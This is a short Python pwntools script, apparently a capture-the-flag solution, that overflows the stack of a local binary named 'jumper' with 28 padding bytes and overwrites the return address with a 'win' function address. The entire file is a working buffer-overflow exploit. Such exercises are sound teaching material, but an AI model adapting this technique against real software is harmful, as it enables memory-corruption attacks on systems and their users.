from pwn import *

global p
p = process("./jumper")

win = 0x80491d1

exploit = b"A" * 28
exploit += p32(win)

p.sendlineafter("Hello\n", exploit)
p.interactive()
p.close()
